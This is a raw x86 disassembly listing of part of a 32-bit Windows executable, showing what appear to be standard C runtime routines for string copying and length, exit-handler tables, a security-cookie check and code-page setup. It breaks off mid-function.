  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
